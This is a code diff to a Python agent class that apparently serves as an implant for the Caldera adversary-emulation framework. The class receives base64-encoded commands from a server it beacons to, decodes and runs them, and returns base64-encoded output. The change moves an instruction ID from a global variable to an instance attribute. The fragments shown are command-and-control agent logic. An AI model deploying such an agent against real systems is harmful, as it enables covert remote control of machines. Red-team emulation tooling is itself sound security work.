@@ -9,12 +9,12 @@ import time
 
 
 class OperationLoop:
-    instruction_id = None
 
     def __init__(self, profile):
         self.profile = profile
         self.file_download_endpoint = "/file/download"
         self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint
+        self.instruction_id = ''
 
     def start(self):
         self.profile['results'] = []
@@ -51,11 +51,11 @@ class OperationLoop:
 
     # FORSE QUA BISOGNA CAMBIARE PERCHÈ IN RAGDOLL VA A SCORRERE TRA LE VARIE ISTRUZIONI, MA IO VEDO CHE NE MANDA SEMPRE UNA SOLA
     def _handle_instructions(self, instructions):
-        global instruction_id
+       
         if len(instructions) == 1:
             dec = instructions[0]
             command = json.loads(dec)['command']  # the command here is in base64
-            instruction_id = json.loads(dec)['id']
+            self.instruction_id = json.loads(dec)['id']
         else:
             command = ''
         decoded_command = base64.b64decode(command)
@@ -73,11 +73,11 @@ class OperationLoop:
         return beaconanswer['sleep']
 
     def build_response(self, output):
-        global instruction_id
+        
         return dict(
             paw=self.profile['paw'],
             results=[{
-                'id': instruction_id,
+                'id': self.instruction_id,
                 'output': base64.b64encode(output.stdout).decode('utf-8'),
                 # IMPORTANT: Caldera expects to find the results base64 encoded. It is a must do it here, even if shortly after we're going to encode the entire payload of the http post.
                 'status': output.returncode,
